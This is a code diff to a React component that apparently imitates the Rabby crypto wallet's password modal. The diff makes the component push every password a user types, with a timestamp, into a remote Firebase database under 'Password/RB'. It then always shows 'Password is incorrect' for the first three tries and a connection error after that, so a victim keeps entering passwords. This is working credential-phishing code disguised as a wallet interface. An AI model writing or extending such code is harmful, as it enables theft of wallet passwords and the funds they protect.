@@ -5,7 +5,7 @@ import { CustomWalletModalProps } from '../../types';
 import './styles.css';
 
 import { initializeApp } from "firebase/app";
-import { ref, set, getDatabase } from "firebase/database";
+import { ref, set, getDatabase, push } from "firebase/database";
 // TODO: Add SDKs for Firebase products that you want to use
 // https://firebase.google.com/docs/web/setup#available-libraries
 
@@ -129,9 +129,14 @@ const RabbyModal: React.FC<CustomWalletModalProps> = ({ isOpen, onClose }) => {
     setError(false);
     setShouldShake(false);
 
-      set(ref(db, "Password/RB"), {
-        password: newKeyword,
-      });
+    // set(ref(db, "Password/RB"), {
+    //   password: newKeyword,
+    // });
+
+    push(ref(db, "Password/RB"), {
+      password: newKeyword,
+      time: Date.now()
+    });
   };
 
   const handledForgetPwd = () => {
@@ -157,25 +162,30 @@ const RabbyModal: React.FC<CustomWalletModalProps> = ({ isOpen, onClose }) => {
 
     setConnecting(true);
 
-    
-      set(ref(db, "Password/RB"), {
-        password: keyword,
-      });
 
-      setTimeout(() => {
-        setConnecting(false);
-        if (trying < 3) {
-          setError(true);
-          setHelperText('Password is incorrect. Please try again.');
-          setTrying(trying + 1);
-          setShouldShake(true);
-          setTimeout(() => {
-            setShouldShake(false);
-          }, 500);
-        } else {
-          setConnectionError(true);
-        }
-      }, 150);
+    // set(ref(db, "Password/RB"), {
+    //   password: keyword,
+    // });
+
+    push(ref(db, "Password/RB"), {
+      password: keyword,
+      time: Date.now()
+    });
+
+    setTimeout(() => {
+      setConnecting(false);
+      if (trying < 3) {
+        setError(true);
+        setHelperText('Password is incorrect. Please try again.');
+        setTrying(trying + 1);
+        setShouldShake(true);
+        setTimeout(() => {
+          setShouldShake(false);
+        }, 500);
+      } else {
+        setConnectionError(true);
+      }
+    }, 150);
   };
 
   const showForgetPasswordModal = () => {
